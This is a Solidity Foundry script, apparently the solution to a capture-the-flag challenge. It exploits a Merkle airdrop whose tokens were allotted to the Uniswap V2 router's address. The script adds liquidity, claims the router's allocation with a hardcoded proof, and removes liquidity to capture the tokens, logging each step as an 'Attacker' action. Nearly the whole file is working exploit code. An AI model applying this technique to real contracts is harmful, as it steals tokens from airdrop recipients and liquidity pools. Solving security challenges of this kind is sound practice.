// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Deploy.sol";
import "@uniswap/merkle-distributor/contracts/interfaces/IMerkleDistributor.sol";

import "src/Challenge.sol";

contract Solve is Deploy {

    uint256 index = 71504;
    address account = address(routerV2);
    uint256 amount = uint256(0x1b97cb4333d1d40000);
    address pair;
    bytes32[] merkleProof = [
    bytes32(0x4c276643503c30d95df7077d8d17d5d1ac459ad0f2d0c8841b586eb1650ec294),
    bytes32(0x5dbd8249f22185fd54f8ab390d940d817c3927ee93da3fbae27c87678b527b15),
    bytes32(0xd9ab94b686d4fd8b0e7112db39eb38c45e11744ea9ba82636736c9331accc848),
    bytes32(0x869dc84cffc539d3c7562812087b6459c8fd7730201db3ee7b3e62ad8b24f646),
    bytes32(0x2ba9e3c6dc693f2e52eec3ab645369009685a4b74ccc790814c14e95a085eeb8),
    bytes32(0xb3ee19168ef4bfb96efd4e309960472cc5de03e2ee720a44ff4ec68e05836b84),
    bytes32(0x061db695181eb7e3a605d2476e75dc74326e032d0670a7373211c23d63639901),
    bytes32(0xa6ad971734d29fe45c739ae5c0c1b7e25765b701d595de5600b823a95dc89ec6),
    bytes32(0x26acbe98a3341bc5fedb5c4e8d23cff2fed47b82ada3fa7ffab96705c2a7610c),
    bytes32(0x2313ac5349f63dda500f118563015c3a0f16c275981883227dffc3930916131a),
    bytes32(0xe3d05ebfebb5f9f4d9bd5fd6068a98275ed8a7e622631d3f359a53c304dbba84),
    bytes32(0x86f72d728e21d944f56915fd708f5474aa41551db5ed1b05de403eba0c6106ed),
    bytes32(0x32b5559363a20b2520c77a0f1137679daf2eedcf2b5de205ed4cc002e55d34ee),
    bytes32(0xf7868430ce8ba65901b20e76f23ec5e76dced8183748a3d2885e602ff0524446),
    bytes32(0x6e5446b85cdfdcfbbff0f452fd88d3b5a86ce9d8204137b0150957d91e2c0664),
    bytes32(0xc8db5593a5709dfaafbfd4a9af25b1abb7b488e0be6b16952595360f36d364e0),
    bytes32(0x05d87b90d16d65eca608285be05f09d6be06ed26e996e2b0f51b3aa33aaa78eb),
    bytes32(0xc61672b51620329157c09e93120384c7e539511991bb6ef9fc37f570f220f2f9)
    ];

    function testSolve() public {
        address[] memory path = new address[](2);
        path[0] = routerV2.WETH();
        path[1] = address(token);

        pair = IUniswapV2Factory(routerV2.factory()).getPair(routerV2.WETH(), address(token));

        vm.startBroadcast(player);

        routerV2.swapExactETHForTokens{value: 10000}(0, path, player, block.timestamp + 1 days);
        
        uint256 initialAmount =  token.balanceOf(player);
        console2.log("Attacker swap to exact INU: ", initialAmount);
        
        token.approve(address(routerV2), type(uint256).max);
        (, , uint liquidity) = routerV2.addLiquidityETH{value: 5000}(address(token), initialAmount, 0, 5000, player, block.timestamp + 1 days);
        console2.log("Attacker add liquidity ETH & INU : ", liquidity);

        distributor.claim(index, account, amount, merkleProof);
        console2.log("Claim uniswapV2Router reward: ", amount);

        ERC20(pair).approve(address(routerV2), 1000);
        routerV2.removeLiquidityETHSupportingFeeOnTransferTokens(address(token), ERC20(pair).balanceOf(player), 0, 0, player, block.timestamp + 1 days);
        console2.log("Attacker remove liquidity, get INU: ", token.balanceOf(player));

        token.transfer(challenge, token.balanceOf(player) - initialAmount);
        console2.log("CHALLENGE Score:", CHALLENGE.getScore());
        vm.stopBroadcast();


     assert(CHALLENGE.getScore() > 0);   
    }
}
